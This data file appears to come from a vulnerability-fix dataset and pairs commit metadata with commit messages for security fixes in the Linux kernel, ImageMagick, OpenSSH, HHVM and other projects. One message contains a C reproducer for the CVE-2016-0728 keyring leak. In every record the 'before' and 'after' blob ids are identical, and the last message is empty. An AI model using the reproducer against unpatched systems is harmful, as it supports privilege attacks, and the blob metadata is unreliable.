set_fat(): Fix off-by-2 error leading to corruption in FAT12\n\nIn FAT12 two 12 bit entries are combined to a 24 bit value (three bytes). Therefore, when an even numbered FAT entry is set in FAT12, it must be be combined with the following entry. To prevent accessing beyond the end of the FAT array, it must be checked that the cluster is not the last one.\n\nPreviously, the check tested that the requested cluster was equal to fs->clusters - 1. However, fs->clusters is the number of data clusters not including the two reserved FAT entries at the start so the test triggered two clusters early.\n\nIf the third to last entry was written on a FAT12 filesystem with an odd number of clusters, the second to last entry would be corrupted. This corruption may also lead to invalid memory accesses when the corrupted entry becomes out of bounds and is used later.\n\nChange the test to fs->clusters + 1 to fix.\n\nReported-by: Hanno Böck Signed-off-by: Andreas Bombe <aeb@debian.org>

======================================================================
Commit With Fix: 
    4751b606fa38edc456d627140898a7ec679fcc24
File(s) In Commit: 
    src/gd_interpolation.c
Blob(s) In Commit: 
    f00c946228652e922057d5e94b714754ef43b4ff
Blob(s) Before Fix: 
    f00c946228652e922057d5e94b714754ef43b4ff
Projects:
    86salo_libgd
Commit Message for 4751b606fa38edc456d627140898a7ec679fcc24:
gdImageScaleTwoPass memory leak fix\n\nFixing memory leak in gdImageScaleTwoPass, as reported by @cmb69 and confirmed by @vapier.  This bug actually bit me in production and I'm very thankful that it was reported with an easy fix.\n\nFixes #173.

======================================================================
Commit With Fix: 
    4f68e9661518463fca523c9726bb5d940a2aa6d8
File(s) In Commit: 
    coders/tga.c
Blob(s) In Commit: 
    781933dfbd0c6bcba96c8af93819069282c63410
Blob(s) Before Fix: 
    781933dfbd0c6bcba96c8af93819069282c63410
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 4f68e9661518463fca523c9726bb5d940a2aa6d8:
https://bugs.launchpad.net/ubuntu/+source/imagemagick/+bug/1490362

======================================================================
Commit With Fix: 
    7b1cf5784b5bcd85aa9293ecf56769f68c037231
File(s) In Commit: 
    MagickCore/transform.c
Blob(s) In Commit: 
    c3967242d04e97405167e13d82468f13c58f3cc9
Blob(s) Before Fix: 
    c3967242d04e97405167e13d82468f13c58f3cc9
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 7b1cf5784b5bcd85aa9293ecf56769f68c037231:
Fixed out of bounds error in SpliceImage.

======================================================================
Commit With Fix: 
    5b4bebaa91849c592a8448bc353ab25a54ff8c44
File(s) In Commit: 
    MagickCore/constitute.c
Blob(s) In Commit: 
    dc6ec49c131aff898964ae458eb8ead7aee361e3
Blob(s) Before Fix: 
    dc6ec49c131aff898964ae458eb8ead7aee361e3
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 5b4bebaa91849c592a8448bc353ab25a54ff8c44:
https://github.com/ImageMagick/ImageMagick/pull/34

======================================================================
Commit With Fix: 
    97aa7d7cfd2027f6ba7ce42caf8b798541b9cdc6
File(s) In Commit: 
    coders/hdr.c
Blob(s) In Commit: 
    cd07f22e7fc0ea5ad68684e9f2a94fabc524a02f
Blob(s) Before Fix: 
    cd07f22e7fc0ea5ad68684e9f2a94fabc524a02f
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 97aa7d7cfd2027f6ba7ce42caf8b798541b9cdc6:
Fixed infinite loop and added checks for the sscanf result.

======================================================================
Commit With Fix: 
    f96664974774bfeb237a7274f512f64aaafb201e
File(s) In Commit: 
    src/hb-ot-layout-gpos-table.hh
Blob(s) In Commit: 
    568b5f63a96013f487a861202e10c6ad637b2512
Blob(s) Before Fix: 
    568b5f63a96013f487a861202e10c6ad637b2512
Projects:
    00ERNEST00_FFmpeg
    031087_harfbuzz
Commit Message for f96664974774bfeb237a7274f512f64aaafb201e:
Fix another memory access issue discovered by libFuzzer\n\nFixes https://github.com/behdad/harfbuzz/issues/139#issuecomment-146984679

======================================================================
Commit With Fix: 
    cf0aa7751f6ef8445e9310a64b14dc81460ca156
File(s) In Commit: 
    dbdimp.c
Blob(s) In Commit: 
    acdfee8c450b203562807f7434750fd228afe348
Blob(s) Before Fix: 
    acdfee8c450b203562807f7434750fd228afe348
Projects:
    Acidburn0zzz_DBD-mysql
Commit Message for cf0aa7751f6ef8445e9310a64b14dc81460ca156:
Merge pull request #45 from hannob/master\n\nFix use after free error.

======================================================================
Commit With Fix: 
    6829e274a623187c24f7cfc0e3d35f25d087fcc5
File(s) In Commit: 
    arch/arm64/mm/dma-mapping.c
Blob(s) In Commit: 
    e0f14ee26b6818167cde2a6e955ffb59e339c9ad
Blob(s) Before Fix: 
    e0f14ee26b6818167cde2a6e955ffb59e339c9ad
Projects:
    0-T-0_ps4-linux
Commit Message for 6829e274a623187c24f7cfc0e3d35f25d087fcc5:
arm64: dma-mapping: always clear allocated buffers\n\nBuffers allocated by dma_alloc_coherent() are always zeroed on Alpha, ARM (32bit), MIPS, PowerPC, x86/x86_64 and probably other architectures. It turned out that some drivers rely on this 'feature'. Allocated buffer might be also exposed to userspace with dma_mmap() call, so clearing it is desired from security point of view to avoid exposing random memory to userspace. This patch unifies dma_alloc_coherent() behavior on ARM64 architecture with other implementations by unconditionally zeroing allocated buffer.\n\nCc: <stable@vger.kernel.org> # v3.14+ Signed-off-by: Marek Szyprowski <m.szyprowski@samsung.com> Signed-off-by: Will Deacon <will.deacon@arm.com>

======================================================================
Commit With Fix: 
    ab79efab0a0ba01a74df782eb7fa44b044dae8b5
File(s) In Commit: 
    fs/overlayfs/copy_up.c
Blob(s) In Commit: 
    871fcb67be9741f2aab81f3d6552306dedf4c967
Blob(s) Before Fix: 
    871fcb67be9741f2aab81f3d6552306dedf4c967
Projects:
    0-T-0_ps4-linux
Commit Message for ab79efab0a0ba01a74df782eb7fa44b044dae8b5:
ovl: fix dentry reference leak\n\nIn ovl_copy_up_locked(), newdentry is leaked if the function exits through out_cleanup as this just to out after calling ovl_cleanup() - which doesn't actually release the ref on newdentry.\n\nThe out_cleanup segment should instead exit through out2 as certainly newdentry leaks - and possibly upper does also, though this isn't caught given the catch of newdentry.\n\nWithout this fix, something like the following is seen:\n\n	BUG: Dentry ffff880023e9eb20{i=f861,n=#ffff880023e82d90} still in use (1) [unmount of tmpfs tmpfs] 	BUG: Dentry ffff880023ece640{i=0,n=bigfile}  still in use (1) [unmount of tmpfs tmpfs]\n\nwhen unmounting the upper layer after an error occurred in copyup.\n\nAn error can be induced by creating a big file in a lower layer with something like:\n\n	dd if=/dev/zero of=/lower/a/bigfile bs=65536 count=1 seek=$((0xf000))\n\nto create a large file (4.1G).  Overlay an upper layer that is too small (on tmpfs might do) and then induce a copy up by opening it writably.\n\nReported-by: Ulrich Obergfell <uobergfe@redhat.com> Signed-off-by: David Howells <dhowells@redhat.com> Signed-off-by: Miklos Szeredi <miklos@szeredi.hu> Cc: <stable@vger.kernel.org> # v3.18+

======================================================================
Commit With Fix: 
    8fff105e13041e49b82f92eef034f363a6b1c071
File(s) In Commit: 
    arch/arm64/kernel/perf_event.c
Blob(s) In Commit: 
    68a74151fa6cf84002cd3be98a0fc29f67a40b02
Blob(s) Before Fix: 
    68a74151fa6cf84002cd3be98a0fc29f67a40b02
Projects:
    0-T-0_ps4-linux
Commit Message for 8fff105e13041e49b82f92eef034f363a6b1c071:
arm64: perf: reject groups spanning multiple HW PMUs\n\nThe perf core implicitly rejects events spanning multiple HW PMUs, as in these cases the event->ctx will differ. However this validation is performed after pmu::event_init() is called in perf_init_event(), and thus pmu::event_init() may be called with a group leader from a different HW PMU.\n\nThe ARM64 PMU driver does not take this fact into account, and when validating groups assumes that it can call to_arm_pmu(event->pmu) for any HW event. When the event in question is from another HW PMU this is wrong, and results in dereferencing garbage.\n\nThis patch updates the ARM64 PMU driver to first test for and reject events from other PMUs, moving the to_arm_pmu and related logic after this test. Fixes a crash triggered by perf_fuzzer on Linux-4.0-rc2, with a CCI PMU present:\n\nBad mode in Synchronous Abort handler detected, code 0x86000006 -- IABT (current EL) CPU: 0 PID: 1371 Comm: perf_fuzzer Not tainted 3.19.0+ #249 Hardware name: V2F-1XV7 Cortex-A53x2 SMM (DT) task: ffffffc07c73a280 ti: ffffffc07b0a0000 task.ti: ffffffc07b0a0000 PC is at 0x0 LR is at validate_event+0x90/0xa8 pc : [<0000000000000000>] lr : [<ffffffc000090228>] pstate: 00000145 sp : ffffffc07b0a3ba0\n\n[<          (null)>]           (null) [<ffffffc0000907d8>] armpmu_event_init+0x174/0x3cc [<ffffffc00015d870>] perf_try_init_event+0x34/0x70 [<ffffffc000164094>] perf_init_event+0xe0/0x10c [<ffffffc000164348>] perf_event_alloc+0x288/0x358 [<ffffffc000164c5c>] SyS_perf_event_open+0x464/0x98c Code: bad PC value\n\nAlso cleans up the code to use the arm_pmu only when we know that we are dealing with an arm pmu event.\n\nCc: Will Deacon <will.deacon@arm.com> Acked-by: Mark Rutland <mark.rutland@arm.com> Acked-by: Peter Ziljstra (Intel) <peterz@infradead.org> Signed-off-by: Suzuki K. Poulose <suzuki.poulose@arm.com> Signed-off-by: Will Deacon <will.deacon@arm.com>

======================================================================
Commit With Fix: 
    951b6a0717db97ce420547222647bcc40bf1eacd
File(s) In Commit: 
    net/bluetooth/rfcomm/sock.c
Blob(s) In Commit: 
    7511df72347f303f3342b8d8243581f327ecd068
Blob(s) Before Fix: 
    7511df72347f303f3342b8d8243581f327ecd068
Projects:
    0-T-0_ps4-linux
Commit Message for 951b6a0717db97ce420547222647bcc40bf1eacd:
Bluetooth: Fix potential NULL dereference in RFCOMM bind callback\n\naddr can be NULL and it should not be dereferenced before NULL checking.\n\nSigned-off-by: Jaganath Kanakkassery <jaganath.k@samsung.com> Signed-off-by: Marcel Holtmann <marcel@holtmann.org>

======================================================================
Commit With Fix: 
    6934da9238da947628be83635e365df41064b09b
File(s) In Commit: 
    fs/ext4/ext4_jbd2.c
Blob(s) In Commit: 
    e770c1ee4613ed6084518f2ec9dca0ff9e53a29a
Blob(s) Before Fix: 
    e770c1ee4613ed6084518f2ec9dca0ff9e53a29a
Projects:
    0-T-0_ps4-linux
Commit Message for 6934da9238da947628be83635e365df41064b09b:
ext4: fix potential use after free in __ext4_journal_stop\n\nThere is a use-after-free possibility in __ext4_journal_stop() in the case that we free the handle in the first jbd2_journal_stop() because we're referencing handle->h_err afterwards. This was introduced in 9705acd63b125dee8b15c705216d7186daea4625 and it is wrong. Fix it by storing the handle->h_err value beforehand and avoid referencing potentially freed handle.\n\nFixes: 9705acd63b125dee8b15c705216d7186daea4625 Signed-off-by: Lukas Czerner <lczerner@redhat.com> Reviewed-by: Andreas Dilger <adilger@dilger.ca> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    f3951a3709ff50990bf3e188c27d346792103432
File(s) In Commit: 
    drivers/scsi/sg.c
Blob(s) In Commit: 
    503ab8b46c0b4e8a73d7e826ba1aaf3be1abd6b0
Blob(s) Before Fix: 
    503ab8b46c0b4e8a73d7e826ba1aaf3be1abd6b0
Projects:
    0-T-0_ps4-linux
Commit Message for f3951a3709ff50990bf3e188c27d346792103432:
sg: Fix double-free when drives detach during SG_IO\n\nIn sg_common_write(), we free the block request and return -ENODEV if the device is detached in the middle of the SG_IO ioctl().\n\nUnfortunately, sg_finish_rem_req() also tries to free srp->rq, so we end up freeing rq->cmd in the already free rq object, and then free the object itself out from under the current user.\n\nThis ends up corrupting random memory via the list_head on the rq object. The most common crash trace I saw is this:\n\n  ------------[ cut here ]------------   kernel BUG at block/blk-core.c:1420!   Call Trace:   [<ffffffff81281eab>] blk_put_request+0x5b/0x80   [<ffffffffa0069e5b>] sg_finish_rem_req+0x6b/0x120 [sg]   [<ffffffffa006bcb9>] sg_common_write.isra.14+0x459/0x5a0 [sg]   [<ffffffff8125b328>] ? selinux_file_alloc_security+0x48/0x70   [<ffffffffa006bf95>] sg_new_write.isra.17+0x195/0x2d0 [sg]   [<ffffffffa006cef4>] sg_ioctl+0x644/0xdb0 [sg]   [<ffffffff81170f80>] do_vfs_ioctl+0x90/0x520   [<ffffffff81258967>] ? file_has_perm+0x97/0xb0   [<ffffffff811714a1>] SyS_ioctl+0x91/0xb0   [<ffffffff81602afb>] tracesys+0xdd/0xe2     RIP [<ffffffff81281e04>] __blk_put_request+0x154/0x1a0\n\nThe solution is straightforward: just set srp->rq to NULL in the failure branch so that sg_finish_rem_req() doesn't attempt to re-free it.\n\nAdditionally, since sg_rq_end_io() will never be called on the object when this happens, we need to free memory backing ->cmd if it isn't embedded in the object itself.\n\nKASAN was extremely helpful in finding the root cause of this bug.\n\nSigned-off-by: Calvin Owens <calvinowens@fb.com> Acked-by: Douglas Gilbert <dgilbert@interlog.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

======================================================================
Commit With Fix: 
    12ca6ad2e3a896256f086497a7c7406a547ee373
File(s) In Commit: 
    kernel/events/core.c
Blob(s) In Commit: 
    0a791a2203dc7b93e9e53cc2669c531fb9f135c4
Blob(s) Before Fix: 
    0a791a2203dc7b93e9e53cc2669c531fb9f135c4
Projects:
    0-T-0_ps4-linux
Commit Message for 12ca6ad2e3a896256f086497a7c7406a547ee373:
perf: Fix race in swevent hash\n\nThere's a race on CPU unplug where we free the swevent hash array while it can still have events on. This will result in a use-after-free which is BAD.\n\nSimply do not free the hash array on unplug. This leaves the thing around and no use-after-free takes place.\n\nWhen the last swevent dies, we do a for_each_possible_cpu() iteration anyway to clean these up, at which time we'll free it, so no leakage will occur.\n\nReported-by: Sasha Levin <sasha.levin@oracle.com> Tested-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Arnaldo Carvalho de Melo <acme@redhat.com> Cc: Frederic Weisbecker <fweisbec@gmail.com> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Stephane Eranian <eranian@google.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: Vince Weaver <vincent.weaver@maine.edu> Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    dd42bf1197144ede075a9d4793123f7689e164bc
File(s) In Commit: 
    drivers/tty/tty_ldisc.c
Blob(s) In Commit: 
    a054d03c22e7b7376824927ce577d46644b01f16
Blob(s) Before Fix: 
    a054d03c22e7b7376824927ce577d46644b01f16
Projects:
    0-T-0_ps4-linux
Commit Message for dd42bf1197144ede075a9d4793123f7689e164bc:
tty: Prevent ldisc drivers from re-using stale tty fields\n\nLine discipline drivers may mistakenly misuse ldisc-related fields when initializing. For example, a failure to initialize tty->receive_room in the N_GIGASET_M101 line discipline was recently found and fixed [1]. Now, the N_X25 line discipline has been discovered accessing the previous line discipline's already-freed private data [2].\n\nHarden the ldisc interface against misuse by initializing revelant tty fields before instancing the new line discipline.\n\n[1]     commit fd98e9419d8d622a4de91f76b306af6aa627aa9c     Author: Tilman Schmidt <tilman@imap.cc>     Date:   Tue Jul 14 00:37:13 2015 +0200\n\n    isdn/gigaset: reset tty->receive_room when attaching ser_gigaset\n\n[2] Report from Sasha Levin <sasha.levin@oracle.com>     [  634.336761] ==================================================================     [  634.338226] BUG: KASAN: use-after-free in x25_asy_open_tty+0x13d/0x490 at addr ffff8800a743efd0     [  634.339558] Read of size 4 by task syzkaller_execu/8981     [  634.340359] =============================================================================     [  634.341598] BUG kmalloc-512 (Not tainted): kasan: bad access detected     ...     [  634.405018] Call Trace:     [  634.405277] dump_stack (lib/dump_stack.c:52)     [  634.405775] print_trailer (mm/slub.c:655)     [  634.406361] object_err (mm/slub.c:662)     [  634.406824] kasan_report_error (mm/kasan/report.c:138 mm/kasan/report.c:236)     [  634.409581] __asan_report_load4_noabort (mm/kasan/report.c:279)     [  634.411355] x25_asy_open_tty (drivers/net/wan/x25_asy.c:559 (discriminator 1))     [  634.413997] tty_ldisc_open.isra.2 (drivers/tty/tty_ldisc.c:447)     [  634.414549] tty_set_ldisc (drivers/tty/tty_ldisc.c:567)     [  634.415057] tty_ioctl (drivers/tty/tty_io.c:2646 drivers/tty/tty_io.c:2879)     [  634.423524] do_vfs_ioctl (fs/ioctl.c:43 fs/ioctl.c:607)     [  634.427491] SyS_ioctl (fs/ioctl.c:622 fs/ioctl.c:613)     [  634.427945] entry_SYSCALL_64_fastpath (arch/x86/entry/entry_64.S:188)\n\nCc: Tilman Schmidt <tilman@imap.cc> Cc: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    76cc404bfdc0d419c720de4daaf2584542734f42
File(s) In Commit: 
    arch/arm/kernel/sys_oabi-compat.c
Blob(s) In Commit: 
    087acb569b63a4bd90982e0c9b15fc2313636c53
Blob(s) Before Fix: 
    087acb569b63a4bd90982e0c9b15fc2313636c53
Projects:
    0-T-0_ps4-linux
Commit Message for 76cc404bfdc0d419c720de4daaf2584542734f42:
[PATCH] arm: fix handling of F_OFD_... in oabi_fcntl64()\n\nCc: stable@vger.kernel.org # 3.15+ Reviewed-by: Jeff Layton <jeff.layton@primarydata.com> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    c623b33b4e9599c6ac5076f7db7369eb9869aa04
File(s) In Commit: 
    arch/arm64/kernel/sys.c
Blob(s) In Commit: 
    75151aaf1a52025237be5e0becc8ffac514bae2c
Blob(s) Before Fix: 
    75151aaf1a52025237be5e0becc8ffac514bae2c
Projects:
    0-T-0_ps4-linux
Commit Message for c623b33b4e9599c6ac5076f7db7369eb9869aa04:
arm64: make sys_call_table const\n\nAs with x86, mark the sys_call_table const such that it will be placed in the .rodata section. This will cause attempts to modify the table (accidental or deliberate) to fail when strict page permissions are in place. In the absence of strict page permissions, there should be no functional change.\n\nSigned-off-by: Mark Rutland <mark.rutland@arm.com> Acked-by: Will Deacon <will.deacon@arm.com> Signed-off-by: Catalin Marinas <catalin.marinas@arm.com>

======================================================================
Commit With Fix: 
    dd504589577d8e8e70f51f997ad487a4cb6c026f
File(s) In Commit: 
    crypto/algif_skcipher.c
Blob(s) In Commit: 
    f4431bc1ce430203b374ae757e627d808c6f17a4
Blob(s) Before Fix: 
    f4431bc1ce430203b374ae757e627d808c6f17a4
Projects:
    0-T-0_ps4-linux
Commit Message for dd504589577d8e8e70f51f997ad487a4cb6c026f:
crypto: algif_skcipher - Require setkey before accept(2)\n\nSome cipher implementations will crash if you try to use them without calling setkey first.  This patch adds a check so that the accept(2) call will fail with -ENOKEY if setkey hasn't been done on the socket yet.\n\nCc: stable@vger.kernel.org Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Tested-by: Dmitry Vyukov <dvyukov@google.com>

======================================================================
Commit With Fix: 
    b9e7f061788c3b86a0c67d2d4158f067ec5eb625
File(s) In Commit: 
    pcsd/pcsd.rb
Blob(s) In Commit: 
    847eb1190c03890a8f6ce432c7eaaa7e9fb61154
Blob(s) Before Fix: 
    847eb1190c03890a8f6ce432c7eaaa7e9fb61154
Projects:
    AdamWill_pcs
Commit Message for b9e7f061788c3b86a0c67d2d4158f067ec5eb625:
fix CSRF vulnerability\n\n * requests /remote/* (GET and POST) and /run_pcs are accessible only with token authentication  * all web UI requests are accessible only with session authentication  * all web UI requests (except for /manage, /managec/<cluster>/main, /permissions ) must    include header: X-Requested-With: XMLHttpRequest

======================================================================
Commit With Fix: 
    5c17c861a357e9458001f021a7afa7aab9937439
File(s) In Commit: 
    drivers/tty/tty_io.c
Blob(s) In Commit: 
    5cec01c75691a6b7ee58ea65346c05572db1bab1
Blob(s) Before Fix: 
    5cec01c75691a6b7ee58ea65346c05572db1bab1
Projects:
    0-T-0_ps4-linux
Commit Message for 5c17c861a357e9458001f021a7afa7aab9937439:
tty: Fix unsafe ldisc reference via ioctl(TIOCGETD)\n\nioctl(TIOCGETD) retrieves the line discipline id directly from the ldisc because the line discipline id (c_line) in termios is untrustworthy  userspace may have set termios via ioctl(TCSETS*) without actually changing the line discipline via ioctl(TIOCSETD).\n\nHowever, directly accessing the current ldisc via tty->ldisc is unsafe  the ldisc ptr dereferenced may be stale if the line discipline is changing via ioctl(TIOCSETD) or hangup.\n\nWait for the line discipline reference (just like read() or write()) to retrieve the "current" line discipline id.\n\nCc: <stable@vger.kernel.org> Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    23567fd052a9abb6d67fe8e7a9ccdd9800a540f2
File(s) In Commit: 
    security/keys/process_keys.c
Blob(s) In Commit: 
    e6d50172872fb2b516f7c88fa3e4ba3e814ffa1a
Blob(s) Before Fix: 
    e6d50172872fb2b516f7c88fa3e4ba3e814ffa1a
Projects:
    0-T-0_ps4-linux
Commit Message for 23567fd052a9abb6d67fe8e7a9ccdd9800a540f2:
KEYS: Fix keyring ref leak in join_session_keyring()\n\nThis fixes CVE-2016-0728.\n\nIf a thread is asked to join as a session keyring the keyring that's already set as its session, we leak a keyring reference.\n\nThis can be tested with the following program:\n\n	#include <stddef.h> 	#include <stdio.h> 	#include <sys/types.h> 	#include <keyutils.h>\n\n	int main(int argc, const char *argv[]) 	{ 		int i = 0  		key_serial_t serial \n\n		serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, 				"leaked-keyring")  		if (serial < 0) { 			perror("keyctl")  			return -1  		}\n\n		if (keyctl(KEYCTL_SETPERM, serial, 			   KEY_POS_ALL | KEY_USR_ALL) < 0) { 			perror("keyctl")  			return -1  		}\n\n		for (i = 0  i < 100  i++) { 			serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, 					"leaked-keyring")  			if (serial < 0) { 				perror("keyctl")  				return -1  			} 		}\n\n		return 0  	}\n\nIf, after the program has run, there something like the following line in /proc/keys:\n\n3f3d898f I--Q---   100 perm 3f3f0000     0     0 keyring   leaked-keyring: empty\n\nwith a usage count of 100 * the number of times the program has been run, then the kernel is malfunctioning.  If leaked-keyring has zero usages or has been garbage collected, then the problem is fixed.\n\nReported-by: Yevgeny Pats <yevgeny@perception-point.io> Signed-off-by: David Howells <dhowells@redhat.com> Acked-by: Don Zickus <dzickus@redhat.com> Acked-by: Prarit Bhargava <prarit@redhat.com> Acked-by: Jarod Wilson <jarod@redhat.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    23c8a812dc3c621009e4f0e5342aa4e2ede1ceaa
File(s) In Commit: 
    lib/asn1_decoder.c
Blob(s) In Commit: 
    554522934c442ae15c01b1b1266e8e3e9515bfbd
Blob(s) Before Fix: 
    554522934c442ae15c01b1b1266e8e3e9515bfbd
Projects:
    0-T-0_ps4-linux
Commit Message for 23c8a812dc3c621009e4f0e5342aa4e2ede1ceaa:
KEYS: Fix ASN.1 indefinite length object parsing\n\nThis fixes CVE-2016-0758.\n\nIn the ASN.1 decoder, when the length field of an ASN.1 value is extracted, it isn't validated against the remaining amount of data before being added to the cursor.  With a sufficiently large size indicated, the check:\n\n	datalen - dp < 2\n\nmay then fail due to integer overflow.\n\nFix this by checking the length indicated against the amount of remaining data in both places a definite length is determined.\n\nWhilst we're at it, make the following changes:\n\n (1) Check the maximum size of extended length does not exceed the capacity      of the variable it's being stored in (len) rather than the type that      variable is assumed to be (size_t).\n\n (2) Compare the EOC tag to the symbolic constant ASN1_EOC rather than the      integer 0.\n\n (3) To reduce confusion, move the initialisation of len outside of:\n\n	for (len = 0  n > 0  n--) {\n\n     since it doesn't have anything to do with the loop counter n.\n\nSigned-off-by: David Howells <dhowells@redhat.com> Reviewed-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Acked-by: David Woodhouse <David.Woodhouse@intel.com> Acked-by: Peter Jones <pjones@redhat.com>

======================================================================
Commit With Fix: 
    8a5e5e02fc83aaf67053ab53b359af08c6c49aaf
File(s) In Commit: 
    include/linux/poison.h
Blob(s) In Commit: 
    253c9b4198effbb6bd29449a507340265760afa5
Blob(s) Before Fix: 
    253c9b4198effbb6bd29449a507340265760afa5
Projects:
    0-T-0_ps4-linux
Commit Message for 8a5e5e02fc83aaf67053ab53b359af08c6c49aaf:
include/linux/poison.h: fix LIST_POISON{1,2} offset\n\nPoison pointer values should be small enough to find a room in non-mmap'able/hardly-mmap'able space.  E.g.  on x86 "poison pointer space" is located starting from 0x0.  Given unprivileged users cannot mmap anything below mmap_min_addr, it should be safe to use poison pointers lower than mmap_min_addr.\n\nThe current poison pointer values of LIST_POISON{1,2} might be too big for mmap_min_addr values equal or less than 1 MB (common case, e.g.  Ubuntu uses only 0x10000).  There is little point to use such a big value given the "poison pointer space" below 1 MB is not yet exhausted.  Changing it to a smaller value solves the problem for small mmap_min_addr setups.\n\nThe values are suggested by Solar Designer: http://www.openwall.com/lists/oss-security/2015/05/02/6\n\nSigned-off-by: Vasily Kulikov <segoon@openwall.com> Cc: Solar Designer <solar@openwall.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: "Kirill A. Shutemov" <kirill.shutemov@linux.intel.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    ab676b7d6fbf4b294bf198fb27ade5b0e865c7ce
File(s) In Commit: 
    fs/proc/task_mmu.c
Blob(s) In Commit: 
    6dee68d013ffa69f1f6c9d49873f17f19eb3874d
Blob(s) Before Fix: 
    6dee68d013ffa69f1f6c9d49873f17f19eb3874d
Projects:
    0-T-0_ps4-linux
Commit Message for ab676b7d6fbf4b294bf198fb27ade5b0e865c7ce:
pagemap: do not leak physical addresses to non-privileged userspace\n\nAs pointed by recent post[1] on exploiting DRAM physical imperfection, /proc/PID/pagemap exposes sensitive information which can be used to do attacks.\n\nThis disallows anybody without CAP_SYS_ADMIN to read the pagemap.\n\n[1] http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html\n\n[ Eventually we might want to do anything more finegrained, but for now   this is the simple model.   - Linus ]\n\nSigned-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com> Acked-by: Konstantin Khlebnikov <khlebnikov@openvz.org> Acked-by: Andy Lutomirski <luto@amacapital.net> Cc: Pavel Emelyanov <xemul@parallels.com> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Mark Seaborn <mseaborn@chromium.org> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    9d8fb070e782c95821c90d0ca7372fc6d7316c78
File(s) In Commit: 
    src/yaws_cgi.erl
Blob(s) In Commit: 
    42a29af6bcf46f8eb9d7697f92784142da137fa6
Blob(s) Before Fix: 
    42a29af6bcf46f8eb9d7697f92784142da137fa6
Projects:
    17204105_yaws
Commit Message for 9d8fb070e782c95821c90d0ca7372fc6d7316c78:
Security flaw http://httpoxy.org/ fixed A security flaw with HTTP_PROXY fixed. When we now construct the cgi env variables, we just skip the Proxy header. Reported by dominic@varspool.com

======================================================================
Commit With Fix: 
    423b4b719afd5ef4e6e19d8447fbf7b6bc0d0a25
File(s) In Commit: 
    hphp/runtime/server/fastcgi/fastcgi-transport.cpp
Blob(s) In Commit: 
    756e12e59e108b7b0595e70479e3cafc449ee641
Blob(s) Before Fix: 
    756e12e59e108b7b0595e70479e3cafc449ee641
Projects:
    10000TB_hhvm
Commit Message for 423b4b719afd5ef4e6e19d8447fbf7b6bc0d0a25:
CVE-2016-1000109: Ignore Proxy HTTP header from fastcgi requests\n\nSummary: The default PHP behavior is to transform a Proxy header from requests into the HTTP_PROXY environment variable in the PHP environment running the request. Some scripts may use this env var to decide which HTTP proxy to connect to, and we don't want requests to have that kind of control over scripts' behavior.\n\nReviewed By: alexmalyshev, Orvid\n\nDifferential Revision: D3579221\n\nfbshipit-source-id: 18a405fd73aee65283aea99ff995f8082b3fc3b5

======================================================================
Commit With Fix: 
    c76fac666ea038753294f2ac94d310f8adece9ce
File(s) In Commit: 
    usr.bin/ssh/serverloop.c
Blob(s) In Commit: 
    3c413e5bb10fe98d0f0bede9913ec6f9f786affc
Blob(s) Before Fix: 
    3c413e5bb10fe98d0f0bede9913ec6f9f786affc
Projects:
    Luigi30_src
Commit Message for c76fac666ea038753294f2ac94d310f8adece9ce:
disable Unix-domain socket forwarding when privsep is disabled

======================================================================
Commit With Fix: 
    ac8147a06ed2e2403fb6b9a0c03e618a9333c0e9
File(s) In Commit: 
    usr.bin/ssh/authfile.c
Blob(s) In Commit: 
    ec685544e7bc80db0e49e19fbeba91e1b496f912
Blob(s) Before Fix: 
    ec685544e7bc80db0e49e19fbeba91e1b496f912
Projects:
    Luigi30_src
Commit Message for ac8147a06ed2e2403fb6b9a0c03e618a9333c0e9:
use sshbuf_allocate() to pre-allocate the buffer used for loading keys. This avoids implicit realloc inside the buffer code, which might theoretically leave fragments of the key on the heap. This doesn't appear to happen in practice for normal sized keys, but was observed for novelty oversize ones.\n\nPointed out by Jann Horn of Project Zero  ok markus@

======================================================================
Commit With Fix: 
    22f6b4d34fcf039c63a94e7670e0da24f8575a5a
File(s) In Commit: 
    fs/aio.c
Blob(s) In Commit: 
    4fe81d1c60f962b53392a6b4b0d047f129509c87
Blob(s) Before Fix: 
    4fe81d1c60f962b53392a6b4b0d047f129509c87
Projects:
    0-T-0_ps4-linux
Commit Message for 22f6b4d34fcf039c63a94e7670e0da24f8575a5a:
